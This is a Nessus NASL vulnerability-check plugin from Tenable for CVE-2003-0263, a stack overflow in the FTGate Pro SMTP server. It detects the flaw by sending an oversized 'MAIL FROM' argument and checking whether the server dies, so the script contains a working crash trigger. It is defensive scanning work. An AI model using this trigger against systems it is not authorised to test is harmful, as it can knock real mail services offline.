#
# (C) Tenable Network Security, Inc.
#

# Ref:
# From: "Dennis Rand" <der@infowarfare.dk>
# To: "Vulnwatch@Vulnwatch. Org" <vulnwatch@vulnwatch.org>,
# Date: Tue, 6 May 2003 14:57:25 +0200
# Subject: [VulnWatch] Multiple Buffer Overflow Vulnerabilities Found in FTGate Pro Mail Server v. 1.22 (1328)


include("compat.inc");

if(description)
{
 script_id(11579);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2003-0263");
 script_bugtraq_id(7506, 7508); 
 script_xref(name:"OSVDB", value:"12066");

 script_name(english:"FTGatePro Mail Server Multiple Command Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote service is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote SMTP server is running FT Gate Pro.

There is a remote stack buffer overflow vulnerability in this
version.  This issue can be exploited by supplying a very long
argument to the 'MAIL FROM' and 'RCPT TO' SMTP commands.

A remote attacker could use this to crash the SMTP server, or
possibly execute arbitrary code." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0052.html"
 );
 script_set_attribute(attribute:"solution", value:
"Upgrade to FTgate Pro Mail Server v. 1.22 Hotfix 1330 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );


script_end_attributes();

 script_summary(english:"Checks for FTgate");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");
 script_dependencie("smtpserver_detect.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;

banner = get_smtp_banner(port:port);

if(! banner || "FTGatePro" >!< banner) exit(0);

   soc = open_sock_tcp(port);
   if(!soc)exit(0);

   r = smtp_recv_banner(socket:soc);

   send(socket:soc, data:string("HELO there\r\n"));
   r = recv_line(socket:soc, length:4096);

   send(socket:soc, data:string("MAIL FROM: ", crap(2400), "@", crap(2400),".com\r\n\r\n"));
   r = recv_line(socket:soc, length:4096, timeout:1);
   close(soc);

   soc = open_sock_tcp(port);
if (! soc)
{
 security_warning(port:port, extra:string("\nThe remote MTA died.\n"));
 exit(0);
}

   r = smtp_recv_banner(socket:soc);
if( ! r)
 security_warning(port, extra:string("\nThe remote MTA does not display its banner anymore.\n"));

   close(soc);

